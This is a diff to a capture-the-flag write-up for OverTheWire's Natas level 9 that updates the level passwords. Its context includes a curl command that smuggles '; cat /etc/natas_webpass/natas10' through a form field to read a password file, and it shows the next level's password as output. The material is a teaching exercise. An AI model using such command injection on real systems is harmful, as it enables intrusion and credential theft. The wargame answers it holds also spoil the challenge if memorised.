@@ -9,7 +9,7 @@ weight: 10
 | info | value                                      |
 |:-----|-------------------------------------------:|
 | user | `natas9`                                   |
-| pass | `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`         |
+| pass | `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`         |
 | host | `http://natas9.natas.labs.overthewire.org` |
 
 ---
@@ -57,7 +57,7 @@ cool! let's apply it
 
 ```sh
 curl http://natas9.natas.labs.overthewire.org \
--u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t \
+-u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 \
 -d "needle=; cat /etc/natas_webpass/natas10&submit=" | head -30
 ```
 
@@ -73,5 +73,5 @@ following prefixes work to escape the condition:
 ```html
 Output:
 <pre>
-/etc/natas_webpass/natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+/etc/natas_webpass/natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
 ```
